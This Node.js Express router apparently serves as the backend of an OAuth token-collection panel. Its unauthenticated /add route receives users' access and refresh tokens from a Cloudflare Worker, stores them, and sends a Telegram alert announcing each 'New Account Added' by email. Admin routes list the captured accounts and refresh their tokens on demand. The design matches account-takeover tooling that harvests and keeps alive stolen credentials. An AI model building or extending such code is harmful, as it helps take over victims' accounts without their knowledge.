/**
 * Token management routes
 *
 * POST   /api/tokens/add        – Receive token from Cloudflare Worker (no auth required for internal use)
 * GET    /api/tokens            – List all OAuth accounts (admin protected)
 * GET    /api/tokens/:id        – Get a single account (admin protected)
 * POST   /api/tokens/:id/refresh – Manually refresh a token (admin protected)
 * DELETE /api/tokens/:id        – Delete an account (admin protected)
 */

const express = require('express');
const { query } = require('../config/database');
const authMiddleware = require('../middleware/auth');
const { refreshToken } = require('../utils/token-refresh');
const { sendNotification } = require('../utils/telegram');

const router = express.Router();

// ─── Add / upsert a token (called from Cloudflare Worker) ────────────────────

router.post('/add', async (req, res) => {
  const { user_id, email, access_token, refresh_token, token_expiry } = req.body;

  if (!user_id || !email || !access_token || !refresh_token || !token_expiry) {
    return res.status(400).json({ error: 'Missing required fields.' });
  }

  try {
    // Upsert: create or update the record for this user_id
    await query(
      `INSERT INTO oauth_accounts
         (user_id, email, access_token, refresh_token, token_expiry, status, updated_at)
       VALUES ($1, $2, $3, $4, $5, 'active', NOW())
       ON CONFLICT (user_id) DO UPDATE SET
         email         = EXCLUDED.email,
         access_token  = EXCLUDED.access_token,
         refresh_token = EXCLUDED.refresh_token,
         token_expiry  = EXCLUDED.token_expiry,
         status        = 'active',
         updated_at    = NOW()`,
      [user_id, email, access_token, refresh_token, token_expiry]
    );

    await sendNotification(
      `✅ <b>New Account Added</b>\n\n` +
        `📧 Email: <code>${email}</code>\n` +
        `⏰ Token Expiry: ${new Date(token_expiry).toLocaleString()}`
    );

    res.status(201).json({ message: 'Token saved successfully.' });
  } catch (err) {
    console.error('Add token error:', err);
    res.status(500).json({ error: 'Failed to save token.' });
  }
});

// ─── List all accounts ────────────────────────────────────────────────────────

router.get('/', authMiddleware, async (req, res) => {
  try {
    const result = await query(
      `SELECT id, user_id, email, token_expiry, created_at, updated_at, status
       FROM oauth_accounts
       ORDER BY created_at DESC`
    );
    res.json(result.rows);
  } catch (err) {
    console.error('List tokens error:', err);
    res.status(500).json({ error: 'Failed to retrieve accounts.' });
  }
});

// ─── Get single account ───────────────────────────────────────────────────────

router.get('/:id', authMiddleware, async (req, res) => {
  try {
    const result = await query(
      `SELECT id, user_id, email, token_expiry, created_at, updated_at, status
       FROM oauth_accounts
       WHERE id = $1`,
      [req.params.id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Account not found.' });
    }

    res.json(result.rows[0]);
  } catch (err) {
    console.error('Get token error:', err);
    res.status(500).json({ error: 'Failed to retrieve account.' });
  }
});

// ─── Manually refresh a token ─────────────────────────────────────────────────

router.post('/:id/refresh', authMiddleware, async (req, res) => {
  try {
    const accountResult = await query(
      'SELECT * FROM oauth_accounts WHERE id = $1',
      [req.params.id]
    );

    if (accountResult.rows.length === 0) {
      return res.status(404).json({ error: 'Account not found.' });
    }

    const account = accountResult.rows[0];
    const refreshed = await refreshToken(account);

    if (!refreshed) {
      return res.status(502).json({ error: 'Token refresh failed.' });
    }

    res.json({ message: 'Token refreshed successfully.', token_expiry: refreshed.token_expiry });
  } catch (err) {
    console.error('Refresh token error:', err);
    res.status(500).json({ error: 'Failed to refresh token.' });
  }
});

// ─── Delete an account ────────────────────────────────────────────────────────

router.delete('/:id', authMiddleware, async (req, res) => {
  try {
    const result = await query(
      'DELETE FROM oauth_accounts WHERE id = $1 RETURNING email',
      [req.params.id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Account not found.' });
    }

    const { email } = result.rows[0];
    await sendNotification(`🗑️ <b>Account Deleted</b>\n\n📧 Email: <code>${email}</code>`);

    res.json({ message: 'Account deleted successfully.' });
  } catch (err) {
    console.error('Delete token error:', err);
    res.status(500).json({ error: 'Failed to delete account.' });
  }
});

module.exports = router;
